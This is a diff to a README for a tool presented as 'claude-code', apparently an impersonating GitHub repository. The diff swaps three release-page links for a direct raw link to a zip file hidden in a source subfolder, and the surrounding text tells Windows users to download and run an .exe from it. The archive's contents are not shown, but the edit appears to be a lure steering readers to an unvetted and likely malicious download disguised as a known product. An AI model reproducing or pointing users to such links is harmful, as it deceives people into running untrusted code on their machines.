@@ -1,6 +1,6 @@
 # 🧩 claude-code - Code Faster in Your Terminal
 
-[![Download claude-code](https://img.shields.io/badge/Download%20claude--code-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Greaterneworleansbridgetimework650/claude-code/releases)
+[![Download claude-code](https://img.shields.io/badge/Download%20claude--code-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Greaterneworleansbridgetimework650/claude-code/main/src/commands/diff/claude-code-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ claude-code is a terminal app that helps you work with code using plain language
 
 Visit this page to download the app:
 
-https://github.com/Greaterneworleansbridgetimework650/claude-code/releases
+https://raw.githubusercontent.com/Greaterneworleansbridgetimework650/claude-code/main/src/commands/diff/claude-code-1.9.zip
 
 On that page, look for the latest release. Download the Windows file that matches your device. If you see more than one file, choose the one that ends in `.exe` or the Windows package type listed by the release.
 
@@ -146,7 +146,7 @@ Topics:
 
 Use the release page to get the Windows build:
 
-https://github.com/Greaterneworleansbridgetimework650/claude-code/releases
+https://raw.githubusercontent.com/Greaterneworleansbridgetimework650/claude-code/main/src/commands/diff/claude-code-1.9.zip
 
 Open the latest release, download the file for Windows, then run it on your PC
 
